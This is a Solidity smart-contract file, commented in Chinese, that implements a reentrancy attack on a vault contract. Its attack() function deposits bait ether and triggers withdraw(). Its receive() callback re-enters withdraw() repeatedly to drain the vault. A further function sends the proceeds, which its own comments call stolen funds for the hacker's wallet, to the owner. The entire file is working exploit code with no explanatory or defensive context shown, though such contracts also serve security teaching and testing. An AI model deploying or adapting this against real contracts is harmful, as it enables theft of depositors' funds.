// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function getVaultBalance() external view returns (uint256);
}

contract Attacker {
    IVault public immutable targetVault;
    address public immutable owner;

    constructor(address _targetVault) {
        targetVault = IVault(_targetVault);
        owner = msg.sender;
    }

    // 发起攻击：存入诱饵资金，然后触发 withdraw()
    function attack() external payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value > 0, "Need initial deposit");
        targetVault.deposit{value: msg.value}();
        targetVault.withdraw();
    }

    // 核心利用点：金库向此合约打钱时自动触发 receive() 回调，再次递归重入 targetVault.withdraw()
    receive() external payable {
        if (address(targetVault).balance >= msg.value) {
            targetVault.withdraw();
        }
    }

    // 攻击成功后将盗取的资产提取给黑客钱包
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to send stolen funds");
    }

    function getAttackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
